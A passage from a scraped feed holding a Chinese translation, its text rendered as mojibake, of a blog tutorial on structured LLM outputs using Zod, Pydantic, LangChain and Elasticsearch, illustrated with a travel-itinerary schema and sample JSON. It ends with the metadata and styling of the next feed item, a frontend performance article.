<span class="hljs-number">3</span>.    roomType: z.<span class="hljs-built_in">string</span>(), 
<span class="hljs-number">4</span>.    amount: z.<span class="hljs-built_in">number</span>(), 
<span class="hljs-number">5</span>.    checkin: z.iso,<span class="hljs-built_in">date</span>(), 
<span class="hljs-number">6</span>.    checkout: z.iso.<span class="hljs-built_in">date</span>() 
<span class="hljs-number">7</span>.  }),

`AIå†™ä»£ç 
</code></pre>
<p>è¯·æ³¨æ„ï¼Œamount è¢«å®šä¹‰ä¸º number ç±»å‹ï¼Œdates ä½¿ç”¨ ISO æ ¼å¼ï¼Œè¿™æ„å‘³ç€è¾“å‡ºå¯ä»¥ç›´æ¥ç”¨äºè®¡ç®—ã€æ’åºæˆ–å­˜å‚¨ï¼Œæ— éœ€é¢å¤–è§£æã€‚</p>
<p><strong>Flight information</strong></p>
<pre><code class="hljs language-less" lang="less">`

<span class="hljs-number">1</span>.  <span class="hljs-selector-tag">flights</span>: <span class="hljs-selector-tag">z</span><span class="hljs-selector-class">.array</span>(z.<span class="hljs-built_in">object</span>({ 
<span class="hljs-number">2</span>.    <span class="hljs-attribute">carrier</span>: z.<span class="hljs-built_in">string</span>(), 
<span class="hljs-number">3</span>.    <span class="hljs-attribute">flightNo</span>: z.<span class="hljs-built_in">string</span>().<span class="hljs-built_in">max</span>(<span class="hljs-number">8</span>), 
<span class="hljs-number">4</span>.    <span class="hljs-attribute">origin</span>: z.<span class="hljs-built_in">string</span>(), 
<span class="hljs-number">5</span>.    <span class="hljs-attribute">destination</span>: z.<span class="hljs-built_in">string</span>(), 
<span class="hljs-number">6</span>.    <span class="hljs-attribute">date</span>: z.iso.<span class="hljs-built_in">datetime</span>() })),

`<span class="hljs-selector-tag">AI</span>å†™ä»£ç 
</code></pre>
<p>Flights æ˜¯ä¸€ä¸ªå¯¹è±¡æ•°ç»„ï¼Œå› ä¸ºè¡Œç¨‹é€šå¸¸åŒ…å«å¤šä¸ªèˆªæ®µã€‚æˆ‘ä»¬å°† flightNo é™åˆ¶ä¸º 8 ä¸ªå­—ç¬¦ï¼Œå¹¶ä½¿ç”¨ datetime() è€Œä¸æ˜¯ date() æ¥åŒ…å«èµ·é£æ—¶é—´ã€‚</p>
<p>å½“æˆ‘ä»¬è¿è¡Œæ—¶ï¼Œæ¨¡å‹åº”è¯¥ç”Ÿæˆä¸€ä¸ªçœ‹èµ·æ¥åƒè¿™æ ·çš„ JSON å¯¹è±¡ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">`

1.  { 
2.    <span class="hljs-string">"title"</span>: <span class="hljs-string">"Desert Adventure"</span>, 
3.    <span class="hljs-string">"location"</span>: <span class="hljs-string">"Palm Springs, California"</span>, 
4.    <span class="hljs-string">"hotel"</span>: { 
5.      <span class="hljs-string">"name"</span>: <span class="hljs-string">"The Madison"</span>, 
6.      <span class="hljs-string">"roomType"</span>: <span class="hljs-string">"Suite"</span>, 
7.      <span class="hljs-string">"amount"</span>: 250, 
8.      <span class="hljs-string">"checkin"</span>: <span class="hljs-string">"2025-12-15"</span>, 
9.      <span class="hljs-string">"checkout"</span>: <span class="hljs-string">"2025-12-20"</span> 
10.   }, 
11.    <span class="hljs-string">"flights"</span>: [ 
12.      { 
13.        <span class="hljs-string">"carrier"</span>: <span class="hljs-string">"SouthWest Airlines"</span>, 
14.        <span class="hljs-string">"flightNo"</span>: <span class="hljs-string">"AF123"</span>, 
15.        <span class="hljs-string">"origin"</span>: <span class="hljs-string">"SFO"</span>, 
16.        <span class="hljs-string">"destination"</span>: <span class="hljs-string">"PSP"</span>, 
17.        <span class="hljs-string">"date"</span>: <span class="hljs-string">"2025-12-15T18:00:00Z"</span> 
18.      } 
19.   ], 
20.    <span class="hljs-string">"excursions"</span>: [ 
21.      { 
22.        <span class="hljs-string">"name"</span>: <span class="hljs-string">"ATV Desert Tour"</span>, 
23.        <span class="hljs-string">"amount"</span>: 50, 
24.        <span class="hljs-string">"date"</span>: <span class="hljs-string">"2025-12-16T10:00:00Z"</span> 
25.      } 
26.   ] 
27.  }

`AIå†™ä»£ç ![](https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)
</code></pre>
<p>å¦‚æœæ¨¡å‹è¾“å‡ºæ— æ•ˆçš„ JSONã€è¿åæŒ‡å®šçº¦æŸï¼Œæˆ–æœªåŒ…å«å¿…éœ€å­—æ®µï¼Œè¯·æ±‚ä¼šç«‹å³å¤±è´¥ï¼Œè€Œä¸æ˜¯é»˜é»˜åœ°æ¨é€é”™è¯¯æ•°æ®ã€‚</p>
<h3 data-id="heading-5">Pydantic å’Œ Python ç”Ÿæ€ç³»ç»Ÿ</h3>
<p>å¯¹äº Python å¼€å‘è€…ï¼Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.pydantic.dev%2Flatest%2F" title="https://docs.pydantic.dev/latest/" target="_blank" ref="nofollow noopener noreferrer">Pydantic</a> åœ¨ä½œç”¨ä¸Šç±»ä¼¼äº JavaScript/TypeScript ä¸­çš„ Zodï¼Œä¸ºä½ æä¾›è¿è¡Œæ—¶éªŒè¯å’Œå¼ºç±»å‹ç»“æ„åŒ–è¾“å‡ºã€‚</p>
<p>æˆ‘ä»¬ä½¿ç”¨åŒæ ·çš„æ—…è¡Œè¡Œç¨‹ç¤ºä¾‹ï¼Œä¸è¿‡è¿™æ¬¡ä½¿ç”¨ Pydantic æ¨¡å‹å’Œ LangChain å¯¹ç»“æ„åŒ–è¾“å‡ºçš„æ”¯æŒã€‚</p>
<pre><code class="hljs language-ini" lang="ini">`

1.  from datetime import date, datetime
2.  from decimal import Decimal
3.  from typing import List

5.  from pydantic import BaseModel, Field, ConfigDict, condecimal, constr
6.  from langchain_openai import ChatOpenAI

9.  class Hotel(BaseModel):
<span class="hljs-attr">10.      model_config</span> = ConfigDict(populate_by_name=<span class="hljs-literal">True</span>)

12.      name: str
13.      room_type: <span class="hljs-attr">str</span> = Field(..., alias=<span class="hljs-string">"roomType"</span>)
14.      amount: condecimal(<span class="hljs-attr">max_digits</span>=<span class="hljs-number">10</span>, decimal_places=<span class="hljs-number">2</span>, ge=<span class="hljs-number">0</span>) 
15.      checkin: date
16.      checkout: date

19.  class Flight(BaseModel):
<span class="hljs-attr">20.      model_config</span> = ConfigDict(populate_by_name=<span class="hljs-literal">True</span>)

22.      carrier: str
23.      flight_no: constr(<span class="hljs-attr">max_length</span>=<span class="hljs-number">8</span>) = Field(..., alias=<span class="hljs-string">"flightNo"</span>)
24.      origin: str
25.      destination: str
26.      date: datetime

29.  class Excursion(BaseModel):
<span class="hljs-attr">30.      model_config</span> = ConfigDict(populate_by_name=<span class="hljs-literal">True</span>)

32.      name: str
33.      amount: condecimal(<span class="hljs-attr">max_digits</span>=<span class="hljs-number">10</span>, decimal_places=<span class="hljs-number">2</span>, ge=<span class="hljs-number">0</span>)
34.      date: datetime

37.  class TravelItinerary(BaseModel):
<span class="hljs-attr">38.      model_config</span> = ConfigDict(populate_by_name=<span class="hljs-literal">True</span>)

40.      title: str
41.      location: str
42.      hotel: Hotel
43.      flights: List<span class="hljs-section">[Flight]</span>
44.      excursions: List<span class="hljs-section">[Excursion]</span>

<span class="hljs-attr">47.  llm</span> = ChatOpenAI(model=<span class="hljs-string">"gpt-4.1"</span>, temperature=<span class="hljs-number">0</span>)
<span class="hljs-attr">48.  structured_llm</span> = llm.with_structured_output(TravelItinerary)

50.  itinerary: <span class="hljs-attr">TravelItinerary</span> = structured_llm.invoke(
51.      "Generate a travel itinerary based on the specified location."
52.  )

`AIå†™ä»£ç !<span class="hljs-section">[]</span>(https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)æ”¶èµ·ä»£ç å—!<span class="hljs-section">[]</span>(https://csdnimg.cn/release/blogv2/dist/pc/img/arrowup-line-top-White.png)
</code></pre>
<p>è¿™ç§æ–¹æ³•å’Œ Zod ç¤ºä¾‹éå¸¸ç›¸ä¼¼ï¼Œä½ åªéœ€å®šä¹‰ä¸€æ¬¡ schemaï¼Œç„¶åä¾èµ–æ¡†æ¶åœ¨è¿è¡Œæ—¶ä¸ºä½ å¤„ç†éªŒè¯ã€‚ä¸»è¦åŒºåˆ«åœ¨äº Pydantic ä¼šè¿”å›å®é™…çš„ Python å¯¹è±¡ï¼Œè€Œä¸æ˜¯çº¯ç²¹çš„å·²éªŒè¯ JSONã€‚ä½ å¾—åˆ°çš„æ˜¯ä¸€ä¸ªå¸¦æœ‰åµŒå¥—æ¨¡å‹å’Œæ­£ç¡®ç±»å‹å­—æ®µçš„ TravelItinerary å®ä¾‹ï¼Œæ›´é€‚åˆ Python åŸºäºçš„ agent æµæ°´çº¿ã€‚</p>
<p>å½“æˆ‘ä»¬è¿è¡Œæ—¶ï¼Œæ¨¡å‹ç”Ÿæˆçš„ç»“æ„åŒ–æ•°æ®ä¼šæ˜ å°„åˆ° Pydantic æ¨¡å‹ä¸Šï¼Œæˆ‘ä»¬åº”è¯¥å¾—åˆ°ç±»ä¼¼è¿™æ ·çš„å¯¹è±¡ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">`

1.  {
2.    <span class="hljs-string">"title"</span>: <span class="hljs-string">"Palm Springs Getaway"</span>,
3.    <span class="hljs-string">"location"</span>: <span class="hljs-string">"Palm Springs, California"</span>,
4.    <span class="hljs-string">"hotel"</span>: {
5.      <span class="hljs-string">"name"</span>: <span class="hljs-string">"The Madison"</span>,
6.      <span class="hljs-string">"roomType"</span>: <span class="hljs-string">"Suite"</span>,
7.      <span class="hljs-string">"amount"</span>: 250.00,
8.      <span class="hljs-string">"checkin"</span>: <span class="hljs-string">"2025-12-15"</span>,
9.      <span class="hljs-string">"checkout"</span>: <span class="hljs-string">"2025-12-20"</span>
10.    },
11.    <span class="hljs-string">"flights"</span>: [
12.      {
13.        <span class="hljs-string">"carrier"</span>: <span class="hljs-string">"SouthWest Airlines"</span>,
14.        <span class="hljs-string">"flightNo"</span>: <span class="hljs-string">"SW123"</span>,
15.        <span class="hljs-string">"origin"</span>: <span class="hljs-string">"SFO"</span>,
16.        <span class="hljs-string">"destination"</span>: <span class="hljs-string">"PSP"</span>,
17.        <span class="hljs-string">"date"</span>: <span class="hljs-string">"2025-12-15T18:00:00Z"</span>
18.      }
19.    ],
20.    <span class="hljs-string">"excursions"</span>: [
21.      {
22.        <span class="hljs-string">"name"</span>: <span class="hljs-string">"ATV Desert Tour"</span>,
23.        <span class="hljs-string">"amount"</span>: 50.00,
24.        <span class="hljs-string">"date"</span>: <span class="hljs-string">"2025-12-16T10:00:00Z"</span>
25.      }
26.    ]
27.  }

`AIå†™ä»£ç ![](https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)
</code></pre>
<p>è¿™ä¸ª JSON åº”è¯¥ä¸æˆ‘ä»¬ä½¿ç”¨ ZOD ç”Ÿæˆçš„å®Œå…¨ç›¸åŒã€‚åœ¨åº•å±‚ï¼Œè¿™ä¸ª JSON ä¼šè¢«è‡ªåŠ¨è½¬æ¢ä¸ºå¸¦æœ‰åµŒå¥— Hotelã€Flight å’Œ Excursion å®ä¾‹çš„ TravelItinerary å¯¹è±¡ã€‚åŒæ ·ï¼Œå¦‚æœæ¨¡å‹è¾“å‡ºæ— æ•ˆæ•°æ®ã€è¿åçº¦æŸæˆ–æœªåŒ…å«å¿…éœ€å­—æ®µï¼ŒéªŒè¯ä¼šç«‹å³å¤±è´¥ã€‚</p>
<h3 data-id="heading-6">åº•å±‚åŸç†ï¼šJSON schema</h3>
<p>åœ¨ API å±‚é¢ï¼Œæ‰€æœ‰è¿™äº›æ–¹æ³•æœ¬è´¨ä¸Šéƒ½è½¬æ¢ä¸º JSON schemaã€‚åƒ Zod å’Œ Pydantic è¿™æ ·çš„åº“è®©å®šä¹‰è¿™äº› schema æ›´ç›´è§‚ã€å¯¹å¼€å‘è€…å‹å¥½ã€‚</p>
<p>ç›´æ¥ä½¿ç”¨åŸç”Ÿ JSON schema åœ¨éœ€è¦è·¨å›¢é˜Ÿæˆ–æœåŠ¡å…±äº«è¯­è¨€æ— å…³çš„åˆåŒæ—¶ä»ç„¶æœ‰ç”¨ï¼Œä½†ä»£ä»·æ˜¯ä½ ä¼šå¤±å»åŸç”Ÿç±»å‹ã€å¯ç»„åˆæ€§ï¼Œä»¥åŠè¿™äº›åº“æä¾›çš„å¤§éƒ¨åˆ†å¼€å‘ä½“éªŒã€‚</p>
<h2 data-id="heading-7">å°† Elasticsearch ä¸ç»“æ„åŒ–è¾“å‡ºç»“åˆ</h2>
<p>æ§åˆ¶ LLM è¾“å‡ºåªæ˜¯æˆ˜æ–—çš„ä¸€åŠã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“å¦‚ä½•è®©è¿™äº›è¾“å‡ºåœ¨å®é™…ç³»ç»Ÿä¸­æœ‰ç”¨ã€‚Elasticsearch åœ¨è¿™é‡Œéå¸¸åˆé€‚ï¼Œå› ä¸ºå®ƒè®¾è®¡ä¸ŠåŒæ ·é€‚ç”¨äºç»“æ„åŒ–å’Œéç»“æ„åŒ–æ•°æ®ã€‚è¿™åæ˜ äº†ç°ä»£ agent æ¶æ„ï¼šéç»“æ„åŒ–æ•°æ®æä¾›ä¸°å¯Œçš„ä¸Šä¸‹æ–‡ä»¥æ”¯æŒæ¨ç†å’Œæ£€ç´¢ï¼Œç»“æ„åŒ–è¾“å‡ºä½œä¸ºåº”ç”¨å¯ä»¥ä¾èµ–çš„å¥‘çº¦ã€‚Elasticsearch åœ¨è¿™ä¸ªå¾ªç¯ä¸­èµ·æ ¸å¿ƒä½œç”¨ã€‚</p>
<p>ä¸‹é¢æ˜¯ Elasticsearch å¦‚ä½•é€‚é…æ­¤æ–¹æ³•çš„ç¤ºä¾‹ï¼š</p>
<ol>
<li>
<p><strong>éç»“æ„åŒ–è¾“å…¥</strong><br/>
ç”¨æˆ·æŸ¥è¯¢ã€æ–‡æ¡£ã€èŠå¤©è®°å½•ã€æ—¥å¿—æˆ–å·¥å…·è¿½è¸ªç­‰è¢«æ‘„å–åˆ° Elasticsearch ç´¢å¼•ä¸­ã€‚ä¸ºäº†æ•è·ç²¾ç¡®æ–‡æœ¬åŒ¹é…å’Œè¯­ä¹‰å«ä¹‰ï¼Œæˆ‘ä»¬åœ¨ç´¢å¼•è¿™äº›æ•°æ®æ—¶å°†ä½¿ç”¨æ–‡æœ¬å­—æ®µå’Œå‘é‡åµŒå…¥çš„æ··åˆã€‚</p>
</li>
<li>
<p><strong>Elasticsearch ä½œä¸ºä¸Šä¸‹æ–‡å¼•æ“</strong><br/>
å½“ AI agent éœ€è¦ç›¸å…³ä¸Šä¸‹æ–‡æ—¶ï¼Œå®ƒå¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä¸åŒç±»å‹çš„æœç´¢æŸ¥è¯¢ Elasticsearchï¼š</p>
<ol>
<li><strong>è¯­ä¹‰/<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F145485873" title="https://elasticstack.blog.csdn.net/article/details/145485873" target="_blank" ref="nofollow noopener noreferrer">å‘é‡æœç´¢</a></strong>ï¼šæŒ‰è¯çš„æ½œåœ¨å«ä¹‰æœç´¢ã€‚</li>
<li><strong>å…³é”®å­—/æ–‡æœ¬æœç´¢</strong>ï¼šç”¨äºç²¾ç¡®åŒ¹é…å’Œè¿‡æ»¤ã€‚</li>
<li><strong>åœ°ç†ç©ºé—´æœç´¢</strong>ï¼šæŒ‰ä½ç½®æœç´¢ã€‚</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fsearch-labs%2Fblog%2Fhybrid-search-elasticsearch" title="https://www.elastic.co/search-labs/blog/hybrid-search-elasticsearch" target="_blank" ref="nofollow noopener noreferrer">æ··åˆæœç´¢</a>ï¼šä½¿ç”¨ä¸Šè¿°å¤šç§æ–¹å¼æ··åˆæœç´¢ã€‚</li>
</ol>
</li>
<li>
<p><strong>LLM æ¨ç†</strong><br/>
æ£€ç´¢åˆ°çš„ä¸Šä¸‹æ–‡è¢«ä¼ å› LLMï¼Œä½¿å…¶å“åº”åŸºäºæœ€ç›¸å…³çš„æ•°æ®ï¼Œè€Œä¸æ˜¯ä»…ä¾èµ–è®­ç»ƒæ•°æ®ã€‚</p>
</li>
<li>
<p><strong>ç»“æ„åŒ–è¾“å‡ºç”Ÿæˆ</strong><br/>
æ¨¡å‹å—æˆ‘ä»¬ä½¿ç”¨ Zod æˆ– Pydantic åˆ›å»ºçš„ schema é™åˆ¶ï¼Œç”Ÿæˆå·²éªŒè¯çš„ JSON å¯¹è±¡ï¼Œè€Œä¸æ˜¯è‡ªç”±æ–‡æœ¬ã€‚</p>
</li>
<li>
<p><strong>ç»“æ„åŒ–ç´¢å¼•</strong><br/>
å°†å·²éªŒè¯çš„è¾“å‡ºä½¿ç”¨æ˜¾å¼æ˜ å°„ç´¢å¼•å› Elasticsearchï¼Œä½¿æŸ¥è¯¢ã€èšåˆå’Œåˆ†ææ›´åŠ å®¹æ˜“ã€‚</p>
</li>
<li>
<p><strong>é‡ç”¨ä¸è‡ªåŠ¨åŒ–</strong><br/>
ç°åœ¨æ•°æ®å·²æ·»åŠ ç»“æ„åŒ–ï¼Œå°±å¯ä»¥è½»æ¾æŸ¥è¯¢ã€è¿‡æ»¤ã€èšåˆï¼Œæˆ–ç”¨ä½œä¸‹æ¸¸ç³»ç»Ÿå’Œå·¥ä½œæµçš„è¾“å…¥ã€‚</p>
</li>
</ol>
<p>è¿™ä¸ªå¾ªç¯ä½¿ agents èƒ½å°† Elasticsearch åŒæ—¶ç”¨ä½œæ£€ç´¢å±‚å’Œè®°å¿†å­˜å‚¨ï¼Œä»è€Œå®ç°åŸºäºä¸Šä¸‹æ–‡çš„æ¨ç†ã€è‡ªåŠ¨åŒ–å’Œé•¿æœŸå­¦ä¹ ã€‚</p>
<h2 data-id="heading-8">é™åˆ¶</h2>
<p>Marius Schroder çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fmedium.com%2Fmedialesson%2Fstructured-prompting-in-real-projects-checklist-best-practices-c39fa789856b" title="https://medium.com/medialesson/structured-prompting-in-real-projects-checklist-best-practices-c39fa789856b" target="_blank" ref="nofollow noopener noreferrer">ç»“æ„åŒ–æç¤ºæ–‡ç« </a>æåˆ°äº†ä¸€äº›ç»“æ„åŒ–æç¤ºçš„é™åˆ¶ï¼Œè¿™äº›ä¹Ÿé€‚ç”¨äºç»“æ„åŒ–è¾“å‡ºã€‚</p>
<p>ä»–æåˆ°ï¼š</p>
<ul>
<li>
<p><strong>schema å¯ä»¥ä¿è¯æ ¼å¼ä½†ä¸èƒ½ä¿è¯æ­£ç¡®æ€§</strong>ï¼šæ¨¡å‹ä»å¯èƒ½è¾“å‡º â€œåƒåœ¾â€ æ•°æ®ï¼Œå³ JSON ç»“æ„æœ‰æ•ˆä½†å†…å®¹é”™è¯¯ã€‚ä¾‹å¦‚ï¼Œè¡Œç¨‹ schema å¯èƒ½è¦æ±‚æœ‰æ•ˆçš„ ISO æ—¥æœŸã€æ•°å€¼ç±»å‹çš„ä»·æ ¼ï¼Œä»¥åŠä¸è¶…è¿‡ 8 ä¸ªå­—ç¬¦çš„èˆªç­å·ã€‚æ¨¡å‹ä»å¯èƒ½è¿”å› 2 æœˆ 30 æ—¥çš„èˆªç­ï¼ˆä¸å¯èƒ½çš„æ—¥æœŸï¼‰ï¼Œæˆ–è€…ç»™äº”æ˜Ÿçº§é…’åº—æ ‡ 10 ç¾å…ƒã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç»“æ„æœ‰æ•ˆä½†äº‹å®é”™è¯¯ï¼Œè¯´æ˜ schema éªŒè¯çš„æ˜¯æ•°æ®å½¢çŠ¶è€ŒéçœŸå®æ€§ã€‚</p>
</li>
<li>
<p><strong>å¤æ‚æˆ–æ·±åº¦åµŒå¥—çš„ schema ä»å¯èƒ½å¤±è´¥</strong>ï¼šå¦‚æœè¾“å‡ºè¶³å¤Ÿå¤§ï¼Œä»å¯èƒ½é‡åˆ°è§£æå¤±è´¥æˆ– token é™åˆ¶ï¼Œæ¨¡å‹å¯èƒ½æˆªæ–­ä¸åŒéƒ¨åˆ†ã€‚</p>
</li>
<li>
<p><strong>ä¸é€‚åˆåˆ›æ„åœºæ™¯</strong>ï¼šåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè‡ªç”±æ–‡æœ¬å¯èƒ½æ›´å¥½ï¼Œå°¤å…¶æ˜¯å½“ä½ ä¸æƒ³è¿‡åº¦é™åˆ¶ LLM åœ¨åˆ›æ„ä»»åŠ¡ä¸­çš„å‘æŒ¥æ—¶ã€‚</p>
</li>
</ul>
<h2 data-id="heading-9">ç»“è®º</h2>
<p>æœ¬æ–‡æ·±å…¥æ¢è®¨äº†åœ¨å¤š agent ç³»ç»Ÿä¸­æä¾›ç»“æ„åŒ–è¾“å‡ºçš„é‡è¦æ€§ã€å¼€å‘è€…å¸¸ç”¨å·¥å…·ï¼Œä»¥åŠ Elasticsearch å¦‚ä½•è‡ªç„¶æ‰©å±•ã€‚æƒ³äº†è§£æ›´å¤šï¼Œè¯·æŸ¥çœ‹ä»¥ä¸‹èµ„æºã€‚</p>
<h2 data-id="heading-10">èµ„æº</h2>
<ol>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fsearch-labs-redesign.vercel.app%2Fsearch-labs%2Fblog%2Fcontext-engineering-overview" title="https://search-labs-redesign.vercel.app/search-labs/blog/context-engineering-overview" target="_blank" ref="nofollow noopener noreferrer">What is context engineering? | Carly Richmond</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.langchain.com%2Foss%2Fpython%2Flangchain%2Fstructured-output" title="https://docs.langchain.com/oss/python/langchain/structured-output" target="_blank" ref="nofollow noopener noreferrer">LangChain: Structured output</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ftowardsdatascience.com%2Fhands-on-with-anthropics-new-structured-output-capabilities%2F" title="https://towardsdatascience.com/hands-on-with-anthropics-new-structured-output-capabilities/" target="_blank" ref="nofollow noopener noreferrer">A Hands-On Guide to Anthropicâ€™s New Structured Output Capabilities | Thomas Reed</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fopenai.com%2Findex%2Fintroducing-structured-outputs-in-the-api%2F" title="https://openai.com/index/introducing-structured-outputs-in-the-api/" target="_blank" ref="nofollow noopener noreferrer">OpenAI: Introducing structured outputs in the API</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.openai.com%2Fdocs%2Fguides%2Fstructured-outputs" title="https://platform.openai.com/docs/guides/structured-outputs" target="_blank" ref="nofollow noopener noreferrer">OpenAI: Structured outputs</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmedium.com%2Fmedialesson%2Fstructured-prompting-in-real-projects-checklist-best-practices-c39fa789856b" title="https://medium.com/medialesson/structured-prompting-in-real-projects-checklist-best-practices-c39fa789856b" target="_blank" ref="nofollow noopener noreferrer">Structured Prompting in real projects â€” checklist &amp; best practices | Marius Schroder</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.google%2Ftechnology%2Fdevelopers%2Fgemini-api-structured-outputs%2F" title="https://blog.google/technology/developers/gemini-api-structured-outputs/" target="_blank" ref="nofollow noopener noreferrer">Improving Structured Outputs in the Gemini API</a></li>
</ol>
<p>åŸæ–‡ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fsearch-labs%2Fblog%2Fstructured-outputs-elasticsearch-guide" title="https://www.elastic.co/search-labs/blog/structured-outputs-elasticsearch-guide" target="_blank" ref="nofollow noopener noreferrer">www.elastic.co/search-labsâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è€ç‹è¯·å‡ã€å®¢æˆ·å¼€å–·ã€æˆ‘æ•‘ç«ï¼šä¸€åœºé€’å½’æ ‘çš„æ€§èƒ½çªå›´æˆ˜]]></title>    <link>https://juejin.cn/post/7589093895327531017</link>    <guid>https://juejin.cn/post/7589093895327531017</guid>    <pubDate>2025-12-30T00:04:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589093895327531017" data-draft-id="7589093895326220297" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è€ç‹è¯·å‡ã€å®¢æˆ·å¼€å–·ã€æˆ‘æ•‘ç«ï¼šä¸€åœºé€’å½’æ ‘çš„æ€§èƒ½çªå›´æˆ˜"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,æ€§èƒ½ä¼˜åŒ–"/> <meta itemprop="datePublished" content="2025-12-30T00:04:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸ä¸€æ ·çš„å°‘å¹´_"/> <meta itemprop="url" content="https://juejin.cn/user/3035079961218551"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è€ç‹è¯·å‡ã€å®¢æˆ·å¼€å–·ã€æˆ‘æ•‘ç«ï¼šä¸€åœºé€’å½’æ ‘çš„æ€§èƒ½çªå›´æˆ˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3035079961218551/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸ä¸€æ ·çš„å°‘å¹´_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T00:04:20.000Z" title="Tue Dec 30 2025 00:04:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252b3a}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px;color:#5e7ce0}.markdown-body h1{font-size:24px;margin-bottom:5px;margin-top:80px;position:relative;text-align:center}.markdown-body h2{font-size:20px;padding-bottom:12px;border-bottom:1px solid #dfe1e6}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px;margin-top:30px}.markdown-body h5{font-size:14px;margin-top:20px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #dfe1e6;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#ffeeed;color:#c73636;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#252b3a;background:#f8f8f8}.markdown-body a{position:relative;text-decoration:none;color:#5e7ce0;padding-right:18px;padding-bottom:4px}.markdown-body 